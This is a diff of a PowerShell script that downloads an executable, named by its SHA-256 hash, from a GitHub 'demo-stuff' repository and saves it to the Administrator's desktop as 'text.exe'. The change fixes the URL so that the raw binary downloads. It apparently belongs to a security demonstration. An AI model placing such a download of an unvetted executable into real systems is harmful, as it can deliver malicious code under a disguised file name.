@@ -1,3 +1,3 @@
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 
-Invoke-WebRequest https://github.com/AlanKellyEire/demo-stuff/blob/main/ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa.exe -OutFile  'C:\Users\Administrator\Desktop\text.exe'
+Invoke-WebRequest https://github.com/AlanKellyEire/demo-stuff/raw/main/ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa.exe -OutFile  'C:\Users\Administrator\Desktop\text.exe'
